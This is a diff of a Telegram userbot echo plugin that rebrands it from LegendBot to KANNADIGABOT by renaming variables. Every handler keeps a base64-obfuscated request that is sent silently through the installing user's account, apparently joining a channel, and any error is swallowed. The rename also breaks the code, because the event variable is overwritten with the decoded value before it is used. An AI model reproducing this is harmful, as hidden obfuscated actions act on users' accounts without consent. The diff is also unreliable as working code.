@@ -1,4 +1,4 @@
-# Echo remastered by @Mr_Professor_Agora for LegendBot
+# Echo remastered by @Mr_Professor_Agora for KANNADIGABOT
 # Codes by @mrconfused
 # Kang with credits
 
@@ -21,56 +21,56 @@ from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if KANNADIGA.reply_to_msg_id is not None:
+        reply_msg = await KANNADIGA.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = KANNADIGA.chat_id
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            KANNADIGA = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            KANNADIGA = Get(KANNADIGA)
+            await KANNADIGA.client(KANNADIGA)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(LEGEND, "The user is already enabled with echo ")
+            await edit_or_reply(KANNADIGA, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(LEGEND, "Hii....😄🤓")
+        await edit_or_reply(KANNADIGA, "Hii....😄🤓")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(KANNADIGA, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if KANNADIGA.reply_to_msg_id is not None:
+        reply_msg = await KANNADIGA.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = KANNADIGA.chat_id
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            KANNADIGA = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            KANNADIGA = Get(KANNADIGA)
+            await KANNADIGA.client(KANNADIGA)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(LEGEND, "Echo has been stopped for the user")
+            await edit_or_reply(KANNADIGA, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(LEGEND, "The user is not activated with echo")
+            await edit_or_reply(KANNADIGA, "The user is not activated with echo")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(KANNADIGA, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -92,25 +92,25 @@ async def echo(LEGEND):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(LEGEND, reply_text)
+        await edit_or_reply(KANNADIGA, reply_text)
     else:
-        await edit_or_reply(LEGEND, output_str)
+        await edit_or_reply(KANNADIGA, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(LEGEND):
-    if LEGEND.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(KANNADIGA):
+    if KANNADIGA.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(LEGEND.sender_id, LEGEND.chat_id):
+    if is_echo(KANNADIGA.sender_id, KANNADIGA.chat_id):
         await asyncio.sleep(2)
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            KANNADIGA = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            KANNADIGA = Get(KANNADIGA)
+            await KANNADIGA.client(KANNADIGA)
         except BaseException:
             pass
-        if LEGEND.message.text or LEGEND.message.sticker:
-            await LEGEND.reply(LEGEND.message)
+        if KANNADIGA.message.text or KANNADIGA.message.sticker:
+            await KANNADIGA.reply(KANNADIGA.message)
 
 
 CmdHelp("echo").add_command(
